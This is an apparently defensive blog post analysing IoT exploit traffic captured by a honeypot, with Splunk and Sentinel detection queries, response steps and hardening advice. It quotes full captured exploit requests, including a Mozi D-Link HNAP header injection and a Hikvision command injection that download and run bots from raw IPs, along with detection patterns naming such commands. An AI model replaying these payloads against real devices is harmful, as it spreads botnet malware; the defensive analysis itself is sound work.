Router and Camera Exploits on a Web Server: What They Mean for the Devices You Can't Put EDR On

137 router, camera and DVR exploits hit my PHP honeypot, including Mozi bots still serving themselves and a scanner with a unique callback token per exploit. The real lesson is about the IoT devices on your own network that have no EDR. Network and endpoint detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.

Key Sections: What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web-Layer Detections · Network and Endpoint Detections · When It Fires · Hardening · IOCs

Part of my honeypot detection series. Org A runs Splunk with CrowdStrike Falcon. Its Falcon queries use Event Search field names; on raw FDR data, apply the normalisation macro first. Org B runs Microsoft Sentinel with Defender for Endpoint. Both have cameras, NVRs and building systems on segmented VLANs. The web-layer KQL ran against the honeypot's real logs. The network and endpoint queries are written from the payloads shown here, so adapt the subnets and field names to your environment.

1. What Hit the Server

137 requests from 52 IPs tried to exploit routers, cameras, DVRs and fibre modems on a server that is none of those things. Botnets don't check what they're talking to. They find an open port 80 and send their whole exploit list, because a request costs them nothing.

That makes this traffic noise for a web server and a warning for everything else you own. The devices these exploits target, the camera in the lobby or the NVR in the comms room, usually have no EDR, no logs and no patching. On your network they're invisible, unless you watch what they say on the wire.

Three senders stood out:

  • A 19-exploit loader (195.178.110[.]78) fired the same 19 exploits in one second, twice in one day. Its shell payload reports back at each stage, with the victim's hostname in the URL.
  • A callback scanner (92.118.39[.]92) put a unique 24-character token in each of 37 exploits, so its server knows which exploit worked on which target. One of them wasn't IoT at all. It was an attempt to run code through an unauthenticated n8n workflow API.
  • Mozi, a peer-to-peer botnet whose operators were reported arrested in 2021, is still spreading. 15 infected devices sent 15 requests, and most of them offered the malware from their own built-in web server.

Exploit Step 2: Hide the command where the logs don't look

Mozi's D-Link exploit puts its command in the SOAPAction header, between backticks, with a harmless XML body as a decoy. This is from my packet capture:

POST /HNAP1/ HTTP/1.0
Host: 13.75.195.138:80
Content-Type: text/xml; charset="utf-8"
SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://211.219.49[.]173:4089/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
Content-Length: 640

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>

My nginx log records bodies but not that header, so in the log the same requests look like boring port-mapping calls. Only the packets show the attack. That's a real lesson for web-log detection: you only see the fields you chose to log.

Delivery Step 3: Fetch the bot, often from another victim

Mozi's URLs point back at the sender's own IP on a random high port. Each infected device serves Mozi.m (MIPS) or Mozi.a (ARM) to the next one (T1105). Ten of the twenty sources that sent a download command were serving the payload themselves. The callback scanner's commands just fetch a unique URL, so the token tells it exactly which exploit worked:

PUT /SDK/webLanguage HTTP/1.1
User-Agent: Go-http-client/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><LanguageSetting><language>(wget -qO- hxxp://178.83.188[.]141:8880/t/f6bfbfee66940e6421cf5014||curl -s hxxp://178.83.188[.]141:8880/t/f6bfbfee66940e6421cf5014||busybox wget -qO- hxxp://178.83.188[.]141:8880/t/f6bfbfee66940e6421cf5014)>/dev/null 2>&1</language></LanguageSetting>

It kills competing bots and shells, picks one of thirteen builds by CPU (T1082), downloads it, and runs it from /tmp with a tag naming the exploit used.

C2 + Actions Step 5: Join the botnet

Mozi uses a DHT peer-to-peer network rather than a central server, and bootstraps from the same public DHT nodes BitTorrent clients use (T1071, T1090.003). Then the device scans for the next victim and waits for DDoS orders (T1498).

4. Web-Layer Detections

For Org B I've parsed the honeypot's nginx log into a WebAccess function. For Org A I've used raw nginx, because these exploits live in the query string and body.

let WebAccess = Syslog
| where SyslogMessage startswith "php_http: "
| extend j = parse_json(substring(SyslogMessage, 10))
| project TimeGenerated, DestHost = Computer, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
          Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
          UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);

W1. Which device class is being targeted

Org B Tested: 9 device classes. D-Link HNAP led with 21 requests from 14 sources.

WebAccess
| extend Hay = strcat(Request, " ", Body)
| extend Target = case(
    Hay has "/cgi-bin/luci/" and Hay has "country=", "TP-Link AX21 (CVE-2023-1389)",
    Hay has "/GponForm/", "GPON router (CVE-2018-10561/2)",
    Hay has "/HNAP1", "D-Link HNAP",
    Hay has "/SDK/webLanguage", "Hikvision (CVE-2021-36260)",
    Hay has "setup.cgi" and Hay has "syscmd", "Netgear DGN syscmd",
    Hay has "/shell?", "MVPower DVR shell",
    Hay has "/boaform/", "Boa ONT login",
    Hay has "/goform/", "Tenda goform",
    Hay has "/device.rsp", "TBK DVR",
    "")
| where isnotempty(Target)
| summarize Requests = count(), Sources = dcount(SrcIp) by Target
| order by Requests desc

Org A

index=web sourcetype=nginx:access
| eval target=case(
    match(_raw, "/cgi-bin/luci/") AND match(_raw, "country="), "TP-Link AX21 (CVE-2023-1389)",
    match(_raw, "/GponForm/"),                         "GPON router (CVE-2018-10561/2)",
    match(_raw, "/HNAP1"),                             "D-Link HNAP",
    match(_raw, "/SDK/webLanguage"),                   "Hikvision (CVE-2021-36260)",
    match(_raw, "setup\.cgi") AND match(_raw, "syscmd"), "Netgear DGN syscmd",
    match(_raw, "/shell\?"),                          "MVPower DVR shell",
    match(_raw, "/boaform/"),                          "Boa ONT login",
    match(_raw, "/goform/"),                           "Tenda goform",
    match(_raw, "/device\.rsp"),                      "TBK DVR")
| where isnotnull(target)
| stats count dc(clientip) as sources by target

On a web server this is informational. Its real use is to run the same logic against your devices' admin interfaces, if you can log them. Any hit means someone on your network, or with access to it, is attacking a device.

W2. Download-and-run command from a raw IP (T1105)

Org B Tested: 108 requests from 20 sources, pointing at 19 download hosts. 10 sources were serving the payload from their own IP.

WebAccess
| extend Hay = url_decode(strcat(Request, " ", Body))
| where Hay matches regex @"(wget|curl|tftp|ftpget)\s+(-\S+\s+)*(https?://)?\d{1,3}(\.\d{1,3}){3}(:\d+)?/"
     or Hay matches regex @"(wget|curl)(\$\{IFS\}|%20|\+)+(-\S+(\$\{IFS\}|%20|\+)+)*https?(://|%3A//)\d"
| extend DropHost = extract(@"https?://(\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?)", 1, Hay)
| summarize Requests = count(), Sources = dcount(SrcIp), DropHosts = dcount(DropHost),
            SelfServed = dcountif(SrcIp, DropHost startswith SrcIp)

Org A

index=web sourcetype=nginx:access
| eval hay=urldecode(_raw)
| where match(hay, "(wget|curl|tftp|ftpget)(\s|\$\{IFS\}|\+)+(-\S+(\s|\$\{IFS\}|\+)+)*(https?://)?\d{1,3}(\.\d{1,3}){3}(:\d+)?/")
| rex field=hay "https?://(?<drop_host>\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?)"
| eval self_served=if(like(drop_host, clientip."%"), 1, 0)
| stats count dc(clientip) as sources dc(drop_host) as drop_hosts sum(self_served) as self_served

A wget or curl to a bare IP inside a request is about as clear a signal as a web log gives. "Self-served" (the download host is the sender) is a Mozi trademark.

5. Network and Endpoint Detections

The devices these exploits target can't run Falcon or Defender for Endpoint. Watch them from the network: Org A uses Zeek and Palo Alto logs in Splunk, and Org B uses firewall logs in CommonSecurityLog plus normalised DNS. Replace the example subnets with your IoT and OT VLANs.

N1. IoT device fetches a binary from a raw IP (T1105)

Org B

let IoTNets = dynamic(["10.50.0.0/16", "192.168.40.0/24"]);   // your camera / NVR / OT VLANs
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where ipv4_is_in_any_range(SourceIP, IoTNets)
| where RequestURL matches regex @"^(https?://)?\d{1,3}(\.\d{1,3}){3}(:\d{2,5})?/"
     or RequestURL has_any ("Mozi.m", "Mozi.a", "/bins/", ".arm7", ".mips", ".mpsl", "router.tplink.sh")
     or RequestURL matches regex @"/b/[efrn]/"
| summarize Requests = count(), Urls = make_set(RequestURL, 20) by SourceIP, DestinationIP, DestinationPort

Org A

index=network (sourcetype=zeek:http OR sourcetype="pan:threat" log_subtype=url)
| eval src=coalesce('id.orig_h', src_ip), dest_ip=coalesce('id.resp_h', dest_ip), dest_port=coalesce('id.resp_p', dest_port),
       url=coalesce(url, 'host'.'uri')
| where cidrmatch("10.50.0.0/16", src) OR cidrmatch("192.168.40.0/24", src)
| where match(url, "^(https?://)?\d{1,3}(\.\d{1,3}){3}(:\d{2,5})?/")
    OR match(url, "Mozi\.[ma]|/bins/|\.(arm7|mips|mpsl)$|router\.tplink\.sh|/b/[efrn]/")
| stats count values(url) as urls by src dest_ip dest_port

Cameras and NVRs talk to a short list of vendor cloud hosts by name. A raw-IP download on a high port, or a file named for a CPU architecture, is a compromise. High severity.

N2. IoT device bootstraps a DHT network (Mozi)

Org B

let IoTNets = dynamic(["10.50.0.0/16", "192.168.40.0/24"]);
let DhtBootstrap = dynamic(["router.bittorrent.com", "dht.transmissionbt.com", "router.utorrent.com", "bttracker.debian.org"]);
ASimDnsActivityLogs
| where TimeGenerated > ago(7d)
| where ipv4_is_in_any_range(SrcIpAddr, IoTNets)
| where DnsQuery in~ (DhtBootstrap)
| summarize Queries = count(), Names = make_set(DnsQuery) by SrcIpAddr

Org A

index=dns (sourcetype=zeek:dns OR sourcetype=stream:dns)
    query IN ("router.bittorrent.com","dht.transmissionbt.com","router.utorrent.com","bttracker.debian.org")
| eval src=coalesce('id.orig_h', src_ip)
| where cidrmatch("10.50.0.0/16", src) OR cidrmatch("192.168.40.0/24", src)
| stats count values(query) as queries by src

A camera has no reason to look up router.bittorrent.com. Mozi does it to join its peer network. Any hit from an IoT subnet is a confirmed infection.

Both EDR vendors can also discover unmanaged devices from the managed ones around them: Defender for Endpoint device discovery, and Falcon's asset inventory. Use them to find the cameras and routers you didn't know you had, then put those in the IoT subnet lists above.

E1. Mirai-style loader on a Linux server (T1105, T1082)

The same exploits hit servers that do run EDR. If one lands, the loader's routine is distinctive:

Org A

index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
    ((FileName IN ("killall","pkill") CommandLine IN ("*arm7*","*arm4*","*mips*","*mpsl*","*x86*","*/bin/sh*"))
     OR (CommandLine="*uname -m*" CommandLine="*case*")
     OR CommandLine="*chmod 777*")
| bin _time span=2m
| stats dc(FileName) as tools values(CommandLine) as commands by _time aid ComputerName UserName
| where tools >= 2

Org B

DeviceProcessEvents
| where Timestamp > ago(7d)
| where (FileName in~ ("killall", "pkill") and ProcessCommandLine has_any ("arm7", "arm4", "mips", "mpsl", "x86", "/bin/sh"))
     or (ProcessCommandLine has "uname -m" and ProcessCommandLine has "case")
     or ProcessCommandLine has "chmod 777"
| summarize Tools = dcount(FileName), Commands = make_set(ProcessCommandLine, 20)
          by DeviceName, AccountName, bin(Timestamp, 2m)
| where Tools >= 2

killall aimed at architecture names, a case on uname -m, and chmod 777, all within two minutes. That's a bot, not an admin. High severity.

E2. Workflow automation spawning a shell (n8n)

The callback scanner tried to create an n8n workflow whose Code node runs a command. If you run n8n or a similar automation tool, watch what it starts:

Org A

index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
    (ParentBaseFileName="node" OR GrandParentBaseFileName="node")
    FileName IN ("sh","bash","dash","wget","curl","busybox","python*")
| lookup automation_hosts.csv ComputerName OUTPUT app
| where app="n8n"
| table _time ComputerName UserName GrandParentBaseFileName ParentBaseFileName FileName CommandLine

Org B

DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName == "node" or InitiatingProcessParentFileName == "node"
| where InitiatingProcessCommandLine has "n8n" or InitiatingProcessParentFileName has "n8n"
| where FileName in~ ("sh", "bash", "dash", "wget", "curl", "busybox", "python3")
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, FileName, ProcessCommandLine

Some workflows run commands on purpose. Baseline them, and anything new is worth a look.

6. When It Fires

  1. W1 or W2 against a web server: noise. Close it, unless the target really is one of these devices.
  2. N1 or N2 on an IoT subnet: the device is compromised. You can't contain it with EDR, so block it at the switch or firewall. Then reflash or replace it. A reboot clears Mozi from memory, but the device will be reinfected within minutes if its admin interface is still exposed.
  3. Find the exposure. Work out how the exploit reached the device. Usually it's a port forward, UPnP, or a flat network where a laptop can reach it. Fix that before you put a clean device back.
  4. E1 or E2 on a server: Org A Network-contain it in Falcon. Org B Isolate it in Defender. Collect the binary from /tmp, then rebuild.

7. Hardening

  • Never expose device admin interfaces to the internet, and turn off UPnP on edge routers.
  • Put IoT and OT devices in their own VLAN. Default-deny their outbound traffic, except to the vendor hosts they need.
  • Change default credentials. Twelve of these requests were simply logging in with one.
  • Log request headers you care about (SOAPAction, X-Forwarded-For, Next-Action) at your WAF or reverse proxy. Attacks hide in the fields you don't log.
  • Put authentication in front of n8n and similar tools, and never expose their APIs publicly.
